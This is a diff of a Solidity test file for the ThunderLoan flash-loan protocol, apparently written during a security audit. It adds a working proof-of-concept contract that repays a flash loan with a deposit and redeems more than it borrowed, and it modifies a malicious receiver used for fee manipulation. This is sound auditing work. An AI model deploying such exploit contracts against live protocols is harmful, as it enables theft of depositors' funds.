@@ -109,7 +109,6 @@ contract ThunderLoanTest is BaseTest {
         // 2. fund TSwap DEX
         vm.startPrank(liquidityProvider); // create an investor
         tokenA.mint(liquidityProvider, 100e18); // create investor balance
-        assertEq(tokenA.balanceOf(liquidityProvider), 100e18);
         tokenA.approve(address(tswapPool), 100e18); // Approve the TSwap contract to spend tokens
         weth.mint(address(liquidityProvider), 100e18); // create weth balance
         weth.approve(address(tswapPool), 100e18);
@@ -117,8 +116,6 @@ contract ThunderLoanTest is BaseTest {
         vm.stopPrank();
         // Ratio 100 weth & 100 tokenA
         // price 1:1
-        assert(weth.balanceOf(address(tswapPool)) == 100e18);
-        assert(tokenA.balanceOf(address(tswapPool)) == 100e18);
 
         // 3. fund thunderLoan (pool)
         // set tokenA as an allowed token on thunderLoan
@@ -126,7 +123,6 @@ contract ThunderLoanTest is BaseTest {
         thunderLoan.setAllowedToken(tokenA, true); // greenlight tokenA
         // fund
         tokenA.mint(liquidityProvider, 1000e18); // create investor balance
-        assertEq(tokenA.balanceOf(liquidityProvider), 1000e18);
 
         vm.startPrank(liquidityProvider); // have the investor do:...
         tokenA.approve(address(thunderLoan), 1000e18); // approve for transfer
@@ -153,19 +149,75 @@ contract ThunderLoanTest is BaseTest {
         );
 
         vm.startPrank(user);
-        tokenA.mint(address(flr), 50e18);
+        tokenA.mint(address(flr), 100e18);
         thunderLoan.flashloan(address(flr), tokenA, amountToBorrow, "");
         vm.stopPrank();
 
         uint256 attackFee = flr.feeOne() + flr.feeTwo();
         console.log("attack fee is: ", attackFee, " weth");
-        assert(normalFeeCost < attackFee);
+        assert(normalFeeCost > attackFee);
     }
 
     function testConsoleLog() public view {
         console.log("hello world");
     }
+    // Now that we know the repay function is not strictly necessary to succesfully close the flashloan, but it only
+    // looks at the balance, we can test matching the balance by depositing. (like a liquidity provider).
+
+    function testUseDepositInsteadOfRepayToStealFunds() public setAllowedToken hasDeposits {
+        vm.prank(user);
+        uint256 amountToBorrow = 50e18;
+        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
+        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
+        tokenA.mint(address(dor), fee);
+        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
+        dor.redeemMoney();
+        vm.stopPrank();
+
+        assert(tokenA.balanceOf(address(dor)) > 50e18 + fee);
+    }
 }
+
+contract DepositOverRepay is IFlashLoanReceiver {
+    ThunderLoan thunderLoan;
+    AssetToken assetToken;
+    address assetTokenAddress;
+    IERC20 s_token;
+
+    constructor(address _thunderLoan) {
+        thunderLoan = ThunderLoan(_thunderLoan);
+    }
+    // the flashloan receiver (interface) so if we call thunderloan.flashloan() this runs:
+
+    function executeOperation(
+        address token, // the token that's being borrowed
+        uint256 amount,
+        uint256 fee,
+        address, /* initiator */
+        bytes calldata /*params*/
+    )
+        external
+        returns (bool)
+    {
+        s_token = IERC20(token);
+        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
+        IERC20(token).approve(address(thunderLoan), amount + fee);
+        thunderLoan.deposit(IERC20(token), amount + fee);
+        // IERC20(token).transfer(address(thunderLoan), fee);
+        return true;
+    }
+
+    function redeemMoney() public {
+        uint256 amount = assetToken.balanceOf(address(this));
+        thunderLoan.redeem(s_token, amount);
+    }
+}
+/////////////////////
+////  mal         ///
+/////////////////////
+///////////////////////
+/////////////////////////
+/////////////////////////\
 
 contract MalicousFlashLoanReceiver is IFlashLoanReceiver {
     ThunderLoan thunderLoan;
@@ -204,13 +256,11 @@ contract MalicousFlashLoanReceiver is IFlashLoanReceiver {
             // we call a second flashloan, so we can see how much cheaper it is
             thunderLoan.flashloan(address(this), IERC20(token), amount, "");
             // repay
-            IERC20(token).approve(address(thunderLoan), amount + fee);
-            thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
         } else {
             // calculate the fee and repay
             feeTwo = fee;
-            IERC20(token).approve(address(thunderLoan), amount + fee);
-            thunderLoan.repay(IERC20(token), amount + fee);
+            IERC20(token).transfer(address(repayAddress), amount + fee);
         }
         return true;
     }
